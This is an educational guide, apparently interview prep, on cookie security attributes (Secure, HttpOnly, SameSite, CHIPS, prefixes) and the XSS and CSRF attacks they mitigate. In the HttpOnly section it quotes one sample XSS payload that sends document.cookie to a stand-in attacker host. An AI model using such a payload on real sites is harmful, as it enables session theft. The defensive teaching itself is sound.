# Cookie Strategy: HttpOnly, SameSite, Secure, Partitioned

## Quick Reference

| Attribute | What it does | Why it matters |
|---|---|---|
| `Secure` | Cookie only sent over HTTPS | Prevents interception on unencrypted connections |
| `HttpOnly` | Inaccessible to JavaScript (`document.cookie`) | Mitigates XSS-based session theft |
| `SameSite` | Controls cross-site sending behavior | Primary CSRF mitigation |
| `Partitioned` (CHIPS) | Cookie scoped to top-level site + origin | Enables tracking-safe cross-site cookies |
| `__Host-` prefix | Forces `Secure`, no `Domain`, path must be `/` | Strongest cookie binding to a specific host |

---

## What Is This?

Cookies are the browser's persistent key-value store for session state, sent automatically on every matching HTTP request. The attributes set on a cookie define its security posture: who can read it (JS? server only?), when the browser sends it (same-site requests only? all requests?), and over what connections (HTTPS only?).

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400
```

Each attribute is a narrow, composable security control. Getting any one wrong — using `SameSite=None` without understanding the implications, or forgetting `HttpOnly` on a session cookie — introduces real vulnerabilities in production.

> **Check yourself:** If `HttpOnly` prevents JavaScript from reading a cookie, why doesn't it prevent XSS attacks entirely?

---

## Why Cookies Work This Way

Cookies were invented in 1994 (Netscape) before the web had a security model. The original design: the server sets a cookie, the browser stores it, the browser sends it on every subsequent request to the same domain. Simple.

The problems that accumulated:
1. **Session theft via XSS**: malicious JS can read cookies and exfiltrate them
2. **CSRF**: browsers send cookies on any request, including cross-site ones — a third-party page can trigger state-changing requests with the user's cookies
3. **Cross-site tracking**: third-party cookies on embedded resources allow advertisers to track users across unrelated sites

Each cookie attribute is a targeted fix for one of these problems. They were added over decades, which is why the API is an accreted set of flags rather than a clean design.

---

## `Secure`

```http
Set-Cookie: token=xyz; Secure
```

The browser only sends this cookie over HTTPS connections. HTTP requests — even to the same domain — don't include it. Prevents an attacker on a local network (coffee shop, corporate proxy) from intercepting session tokens.

Implication: `Secure` cookies set on `https://` cannot be read or overwritten by `http://` requests. This matters for mixed-content sites that handle both protocols.

---

## `HttpOnly`

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

The cookie is excluded from `document.cookie` — JavaScript cannot read, modify, or delete it. The browser still sends it on HTTP requests, but it's invisible to the JS layer.

**What it prevents:** XSS exfiltration. An attacker who injects `<script>fetch('https://evil.com/?c='+document.cookie)</script>` gets nothing from `HttpOnly` cookies — they're not in `document.cookie`.

**What it doesn't prevent:** The injected script can still make authenticated requests directly (the browser will send the HttpOnly cookie with them). `HttpOnly` stops the cookie from leaving the browser, not from being used in-browser. Real XSS mitigation requires `HttpOnly` + CSP + input sanitization.

---

## `SameSite`

`SameSite` is the primary CSRF mitigation in modern browsers.

### `SameSite=Strict`

Cookie is only sent when the request originates from the same site (same registrable domain). Never sent on cross-site navigation — not even when a user clicks a link from another site to yours.

```http
Set-Cookie: admin-token=xyz; SameSite=Strict
```

Best for: high-value sessions (admin panels, banking). The downside: if a user arrives via an external link (email, search result), they appear logged out until they manually navigate. This surprises users.

### `SameSite=Lax` (current browser default)

Sent on same-site requests AND on cross-site **top-level navigations** with "safe" HTTP methods (GET, HEAD). Blocked on cross-site subrequests (AJAX, images, iframes) and on cross-site POST/PUT/DELETE.

```http
Set-Cookie: sessionId=abc123; SameSite=Lax
```

The practical effect: a user clicking a link from Google to your site brings their session cookie. An `<img src="https://yoursite.com/action">` on a third-party site does NOT send it. A malicious form POST from another site does NOT send it — the primary CSRF mitigation.

`Lax` is the safe default for most apps. Since Chrome 80 (2020), cookies without a `SameSite` attribute default to `Lax`.

### `SameSite=None; Secure`

Sent on all requests including cross-site. Required for legitimate third-party use cases: payment iframes, embedded widgets, OAuth flows across domains, A/B testing platforms.

```http
Set-Cookie: widget-session=xyz; SameSite=None; Secure
```

`Secure` is required alongside `None` — browsers reject `SameSite=None` without it. This combination is what's being deprecated for tracking (see Partitioned).

> **Check yourself:** What's the difference between "cross-origin" and "cross-site"? Does `SameSite` operate on origin or site?

---

## Same-origin vs. Same-site

`SameSite` operates on **registrable domain** (eTLD+1), not origin:
- `https://app.example.com` and `https://api.example.com` → same-site (share `example.com`)
- `https://example.com` and `https://example.github.io` → cross-site (different registrable domains)

"Cross-origin" is stricter: different scheme, host, or port. `SameSite` uses the looser "same-site" definition. A cookie on `api.example.com` with `SameSite=Lax` will be sent by requests from `app.example.com` (same-site, different origin).

---

## Cookie Prefixes

Cookie prefixes enforce attribute constraints at the browser level, immune to server-side bugs:

| Prefix | Requirements | Protection |
|---|---|---|
| `__Secure-` | Must have `Secure` | Prevents downgrade to HTTP |
| `__Host-` | Must have `Secure`, no `Domain` attribute, `Path=/` | Cookie is bound to the exact host, can't be overridden by subdomains |

```http
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly; SameSite=Lax
```

The `__Host-` prefix is the strongest binding available — it prevents subdomain cookie injection attacks, where `evil.app.example.com` sets a cookie that overrides `app.example.com`'s session cookie.

---

## `Partitioned` Cookies (CHIPS)

**CHIPS**: Cookies Having Independent Partitioned State.

```http
Set-Cookie: widget-state=xyz; SameSite=None; Secure; Partitioned
```

A partitioned cookie is scoped to both the **cookie's origin** AND the **top-level site**. Without partitioning, `tracker.com`'s cookie from an iframe on `news.com` is the same cookie instance as from an iframe on `social.com` — enabling cross-site tracking. With `Partitioned`, the cookie in `news.com`'s context is isolated from the cookie in `social.com`'s context.

Legitimate third-party use cases (embedded chat widgets, payment iframes, CDN preferences) continue working — the widget remembers state per embedding site. Cross-site tracking becomes impossible — the tracker can't correlate identity across sites.

Chrome's third-party cookie deprecation (privacy sandbox initiative) promotes `Partitioned` as the path forward for legitimate cross-site cookies.

---

## Third-party Cookie Deprecation

Chrome planned to deprecate all non-Partitioned `SameSite=None` cookies (third-party cookies) by 2024, then 2025. As of 2026, the timeline has been adjusted multiple times — but the direction is clear: unpartitioned cross-site cookies will eventually be blocked by default in Chrome (Safari and Firefox already block them).

What this means in practice:
- OAuth flows that set cookies in popups — may need adjustment
- Embedded analytics using cookies — will need server-side or first-party proxies
- A/B testing platforms — need to migrate to first-party storage
- Cross-domain SSO — needs explicit CHIPS adoption or first-party cookie forwarding

---

## Gotchas

**1. `SameSite=Lax` is the default, but only for cookies set without `SameSite` since Chrome 80**
Cookies set before Chrome 80 with no `SameSite` attribute are treated as `None` (send on all requests) in older browsers, but `Lax` in newer ones. This causes behavior differences if you have old cookies in the wild.

**2. `SameSite=Strict` breaks OAuth and SSO redirects**
When a user authenticates on `auth.provider.com` and is redirected back to `yourapp.com`, that's a cross-site top-level navigation with a GET — but if the cookie is `SameSite=Strict`, it won't be sent on that initial redirect. The user appears logged out after auth. Use `Lax` for session cookies unless you specifically need `Strict`.

**3. `Secure` cookies can still be overwritten by HTTP**
`Secure` prevents a cookie from being **sent** over HTTP, but a malicious HTTP response can set a new cookie with the same name (without `Secure`) on some browsers, potentially shadowing the secure cookie. The `__Secure-` or `__Host-` prefix prevents this.

**4. `HttpOnly` doesn't prevent all XSS damage**
It prevents cookie theft, but an XSS attacker can still use `fetch()` to make authenticated requests using the browser's cookies (which are sent automatically). The defence-in-depth requires `HttpOnly` + CSP + input sanitization + token binding.

**5. `SameSite=None` without `Secure` is silently rejected**
Browsers drop cookies with `SameSite=None` that lack `Secure`. The Set-Cookie header is accepted but the cookie is not stored. This silent failure is hard to debug — check DevTools Application > Cookies.

**6. Subdomain cookies and `Domain` attribute**
Setting `Domain=.example.com` shares the cookie with all subdomains. Not setting `Domain` scopes the cookie to the exact host. Most sessions should not set `Domain` — it's a privilege escalation if a subdomain is compromised.

---

## Interview Questions

**Q (High): Explain `HttpOnly` and `SameSite` — what attacks does each one mitigate?**

Answer: `HttpOnly` prevents JavaScript from reading the cookie — it's absent from `document.cookie`. This mitigates XSS session theft: an injected script can't exfiltrate the session token to a remote server. `SameSite` controls whether the browser sends the cookie on cross-site requests. `SameSite=Lax` (the default) blocks cookies on cross-site subrequests and non-safe cross-site navigations — this mitigates CSRF, where an attacker's page triggers a state-changing request to your app. They're complementary: `HttpOnly` protects against the cookie leaving the browser via JS; `SameSite` protects against the cookie being misused in cross-site requests.

The trap: candidates explain one but not how they compose. Interviewers want to hear that `HttpOnly` alone doesn't prevent CSRF, and `SameSite` alone doesn't prevent XSS-based request forgery.

**Q (High): What is the difference between `SameSite=Lax` and `SameSite=Strict`? When would you use each?**

Answer: `Lax` sends the cookie on same-site requests plus cross-site top-level GET navigations (clicking a link). `Strict` sends the cookie on same-site requests only — cross-site top-level navigations don't include it. `Lax` is the right default for most session cookies: it blocks CSRF while allowing users to arrive with their session intact (e.g., from a bookmark, email link, or search result). `Strict` is for high-security contexts (admin panels, financial transactions) where you explicitly want the user to "re-enter" your site cleanly from any cross-site navigation — even at the cost of appearing logged out after following an external link.

**Q (High): What are Partitioned cookies (CHIPS) and what problem do they solve?**

Answer: Without partitioning, a third-party cookie (set by `widget.com` embedded in `news.com`) is the same cookie instance across all sites that embed `widget.com`. This allows `widget.com` to recognize the same user across `news.com`, `social.com`, and `shop.com` — cross-site tracking. CHIPS (`Partitioned` attribute) scopes the cookie to the combination of the cookie's origin AND the top-level site. The `widget.com` cookie seen from `news.com`'s context is isolated from its cookie in `social.com`'s context — same widget, different cookie jar. Legitimate use cases (embedded chat, preferences, payments) still work; cross-site identity tracking becomes impossible.

**Q (Medium): What does the `__Host-` cookie prefix enforce and why is it useful?**

Answer: The `__Host-` prefix enforces three constraints: the cookie must have `Secure`, must not have a `Domain` attribute, and must have `Path=/`. Together, these mean the cookie is bound to the exact host, sent only over HTTPS, and covers the entire origin — it can't be set by a subdomain for the parent domain, and can't be downgraded to HTTP. This prevents subdomain-based cookie injection attacks where a compromised subdomain (`evil.app.example.com`) sets a cookie that overrides the session cookie on `app.example.com`. Without the prefix, there's no browser-enforced way to guarantee these constraints — a server bug could accidentally set a cookie without `Secure`.

**Q (Medium): What is the "SameSite=Lax + POST" window and why does it matter for CSRF?**

Answer: When Chrome introduced `SameSite=Lax` as the default, it initially included a 2-minute window during which newly set cookies (with no explicit SameSite) were sent on cross-site POST requests — to avoid breaking OAuth flows that set cookies immediately after a redirect-based auth. This "Lax + POST" temporary window was a compromise, not a design intent. It has since been removed in Chrome. The practical implication: any reliance on cross-site POST sending session cookies — even briefly — should use explicit `SameSite=None; Secure` with proper intent, not rely on any default behavior window.

**Q (Low): Why is `SameSite` described as "same-site" rather than "same-origin"? What's the difference?**

Answer: Same-origin means identical scheme, host, and port — `https://app.example.com:8080` and `https://app.example.com` are different origins. Same-site means the same registrable domain (eTLD+1): `https://app.example.com` and `https://api.example.com` are same-site (both under `example.com`). `SameSite` uses the looser site definition because the use case is preventing cross-domain CSRF from unrelated sites — not preventing requests between subdomains of the same organization. Using origin-level strictness would break typical app architectures where the frontend and API are on different subdomains of the same company domain.

---

## Self-Assessment

- [ ] Explain what `HttpOnly` prevents and what it doesn't (with a concrete XSS example)
- [ ] Describe the three `SameSite` values and which HTTP request types each allows cross-site
- [ ] Explain what `Partitioned` does and why it enables safe third-party cookies
- [ ] Name the two cookie prefixes and what constraints each enforces
- [ ] Explain why `SameSite=Strict` breaks some OAuth flows

---
*Next: LocalStorage vs. SessionStorage — the synchronous, string-only storage APIs and when to use them (or not) compared to cookies and IndexedDB.*
